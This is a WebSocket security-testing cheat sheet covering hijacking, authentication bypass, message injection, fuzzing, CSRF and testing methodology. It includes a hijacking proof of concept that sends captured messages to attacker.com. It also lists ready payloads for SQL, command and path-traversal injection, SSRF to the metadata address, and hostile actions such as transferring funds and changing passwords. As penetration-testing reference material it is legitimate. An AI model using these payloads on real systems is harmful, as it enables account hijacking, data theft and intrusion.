# WebSocket Security Testing

## Overview
Security testing for WebSocket connections including authentication bypass, injection, and hijacking attacks.

## WebSocket Basics
```
# WebSocket upgrade request:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: base64encodedkey==
Sec-WebSocket-Version: 13

# Server response:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: computedhash
```

## Cross-Site WebSocket Hijacking (CSWSH)
```
# WebSockets don't enforce SOP by default
# Browser sends cookies automatically on upgrade request
# If server doesn't validate Origin → CSWSH possible

# Check: does server validate Origin header?
GET /ws HTTP/1.1
Origin: https://attacker.com
# If 101 response → CSWSH vulnerable

# PoC (hosted on attacker.com):
<script>
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
    ws.send('{"action":"get_messages"}');
};
ws.onmessage = function(event) {
    fetch('https://attacker.com/log?data=' + btoa(event.data));
};
</script>

# Victim visits attacker.com → their authenticated WS connection hijacked
```

## Authentication Bypass
```
# Token in URL vs cookie
# Some WS implementations accept token in URL query param
# Others use cookie (auto-sent by browser)

# Test: connect without auth token
# Test: connect with invalid/expired token
# Test: connect with another user's token
# Test: token sent only in upgrade, not re-validated per message

# If auth via Origin only:
Origin: https://target.com  → connects with no credentials
```

## Injection via WebSocket Messages
```
# SQLi in WebSocket message
{"action":"search","query":"' OR 1=1--"}

# NoSQL injection
{"action":"search","filter":{"$where":"1==1"}}

# XSS via WebSocket (if message displayed in DOM)
{"message":"<script>alert(1)</script>"}
{"username":"<img src=x onerror=alert(1)>"}

# Command injection
{"action":"ping","host":"localhost;id"}

# SSRF via WebSocket
{"action":"fetch","url":"http://169.254.169.254/"}

# Path traversal
{"action":"readFile","path":"../../etc/passwd"}
```

## WebSocket Message Fuzzing
```
# Capture a valid WebSocket message
# Modify each field with injection payloads
# Observe server responses

# Common message formats to test:
# JSON: {"key": "INJECT_HERE"}
# XML: <message>INJECT</message>
# Binary protocols: understand format first

# Try:
- Sending unexpected message types
- Sending messages out of order
- Sending very large messages (DoS)
- Sending malformed JSON/XML
- Sending null bytes, special characters
```

## WebSocket CSRF
```
# If WS action causes state change AND no CSRF token:
# CSWSH PoC above is effectively a CSRF via WebSocket

# Send action message after hijack:
ws.send('{"action":"transfer","to":"attacker","amount":1000}')
ws.send('{"action":"change_password","newpass":"hacked"}')
ws.send('{"action":"delete_account"}')
```

## Denial of Service
```
# Connection flood
# Message flood
# Large message DoS

# WebSocket ping/pong abuse
# Multiple connections from same IP
```

## Testing with Burp Suite
```
# Burp intercepts WebSocket messages in HTTP History
# Can modify messages in real-time via Burp Intercept
# Can replay messages via Burp Repeater
# Add payloads in Intruder for fuzzing

# Extensions: WebSocket Turbo Intruder, WS-Attacker
```

## WebSocket Tunneling
```
# Some WAFs don't inspect WebSocket messages
# Use WS to tunnel attacks that WAF would block over HTTP
# WebSocket ≠ HTTP → WAF bypass
```

## Subprotocol Attacks
```
# Sec-WebSocket-Protocol header
# Test with different subprotocols
Sec-WebSocket-Protocol: chat, admin, internal, debug

# If server accepts unknown protocol → may bypass restrictions
```

## Testing Methodology
1. Find all WebSocket endpoints
2. Test CSWSH (modify Origin header)
3. Test authentication (no token, invalid token, expired)
4. Capture and analyze message format
5. Test injection in all message fields (SQLi, XSS, SSRF, command injection)
6. Test authorization (can you send admin messages as regular user?)
7. Test out-of-order message handling
8. Test for DoS with large/many messages

## Tools
- Burp Suite — WebSocket interception and replay
- `wscat` — WebSocket CLI client
- `websocat` — WebSocket CLI tool
- Burp WS Turbo Intruder extension
